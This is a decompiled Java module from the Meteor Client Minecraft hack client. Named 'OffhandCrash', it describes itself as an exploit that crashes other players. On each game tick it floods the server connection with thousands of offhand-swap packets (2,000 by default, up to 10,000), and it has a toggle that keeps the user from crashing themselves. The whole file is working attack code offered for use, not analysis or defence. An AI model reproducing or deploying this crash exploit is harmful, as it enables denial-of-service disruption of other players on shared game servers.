package meteordevelopment.meteorclient.systems.modules.player;

import io.netty.channel.Channel;
import java.util.Objects;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.mixin.ClientConnectionAccessor;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.class_2338;
import net.minecraft.class_2350;
import net.minecraft.class_2846;
import net.minecraft.class_2846.class_2847;

public class OffhandCrash extends Module {
   private static final class_2846 PACKET;
   private final SettingGroup sgGeneral;
   private final Setting<Boolean> doCrash;
   private final Setting<Integer> speed;
   private final Setting<Boolean> antiCrash;

   public OffhandCrash() {
      super(Categories.Misc, "offhand-crash", "An exploit that can crash other players by swapping back and forth between your main hand and offhand.");
      this.sgGeneral = this.settings.getDefaultGroup();
      this.doCrash = this.sgGeneral.add(((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)(new BoolSetting.Builder()).name("do-crash")).description("Sends X number of offhand swap sound packets to the server per tick.")).defaultValue(true)).build());
      SettingGroup var10001 = this.sgGeneral;
      IntSetting.Builder var10002 = ((IntSetting.Builder)((IntSetting.Builder)((IntSetting.Builder)(new IntSetting.Builder()).name("speed")).description("The amount of swaps per tick.")).defaultValue(2000)).min(1).sliderRange(1, 10000);
      Setting var10003 = this.doCrash;
      Objects.requireNonNull(var10003);
      this.speed = var10001.add(((IntSetting.Builder)var10002.visible(var10003::get)).build());
      this.antiCrash = this.sgGeneral.add(((BoolSetting.Builder)((BoolSetting.Builder)((BoolSetting.Builder)(new BoolSetting.Builder()).name("anti-crash")).description("Attempts to prevent you from crashing yourself.")).defaultValue(true)).build());
   }

   @EventHandler
   private void onTick(TickEvent.Post event) {
      if ((Boolean)this.doCrash.get()) {
         Channel channel = ((ClientConnectionAccessor)this.mc.field_1724.field_3944.method_48296()).meteor$getChannel();

         for(int i = 0; i < (Integer)this.speed.get(); ++i) {
            channel.write(PACKET);
         }

         channel.flush();
      }
   }

   public boolean isAntiCrash() {
      return this.isActive() && (Boolean)this.antiCrash.get();
   }

   static {
      PACKET = new class_2846(class_2847.field_12969, new class_2338(0, 0, 0), class_2350.field_11036);
   }
}
